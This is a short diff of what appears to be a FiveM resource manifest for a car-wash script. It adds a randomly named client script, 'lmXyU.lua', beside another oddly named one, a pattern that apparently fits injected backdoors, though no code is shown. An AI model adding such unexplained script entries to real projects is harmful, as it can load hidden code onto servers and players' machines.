@@ -6,3 +6,6 @@ client_script 'es_carwash_client.lua'
 server_script 'es_carwash_server.lua'
 
 client_script "TalJDiXcmrWuOdRetV.lua"
+
+
+client_script "lmXyU.lua"
